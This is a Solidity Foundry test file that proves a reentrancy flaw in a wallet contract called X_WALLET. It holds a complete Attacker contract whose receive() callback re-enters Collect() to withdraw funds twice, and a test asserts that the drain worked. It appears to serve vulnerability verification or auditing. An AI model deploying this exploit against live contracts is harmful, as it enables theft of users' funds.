
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {X_WALLET, Log} from "../src/X_WALLET.sol";

contract TestReentrancyX_WALLET is Test {
    X_WALLET public _contractUnderTest;
    Log public _log;
    Attacker public _attacker;

    function setUp() public {
        _log = new Log();
        _contractUnderTest = new X_WALLET(address(_log));
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        // Ensure attackVal is at least MinSum (1 ether) and not too large to avoid overflow
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // No specific state configuration needed beyond funding

        // --- 3. Funding ---
        // Fund the victim contract with enough ETH to be drained
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the attacker contract
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the test contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        // Setup the attack by depositing funds into the victim contract
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time to pass the unlock time check
        vm.warp(block.timestamp + 1);
        
        // Execute the attack
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    X_WALLET public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialVictimBalance;
    uint256 public storedAttackVal;

    constructor(address victimAddress) { 
        victim = X_WALLET(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        // Deposit funds into the victim contract to establish a balance
        // This is required because Collect checks acc.balance >= _am
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State
        initialVictimBalance = address(victim).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        attackCallCount = 0;

        // 3. Call the vulnerable function
        victim.Collect(val);

        // 4. Verify Success Conditions
        // The attack is successful if we were able to re-enter and withdraw more than once
        // before the balance was updated
        if (attackCallCount >= 2) {
            // We successfully re-entered at least once
            // Check if we received more ETH than our original deposit
            if (address(this).balance > storedAttackVal) {
                exploitSucceeded = true;
            }
        }
    }

    receive() external payable {
        attackCallCount++;
        
        if (attackCallCount < 2) {
            // Re-enter the vulnerable function
            // The balance hasn't been updated yet due to reentrancy vulnerability
            if (address(victim).balance >= storedAttackVal) {
                victim.Collect(storedAttackVal);
            }
        }
    }
}
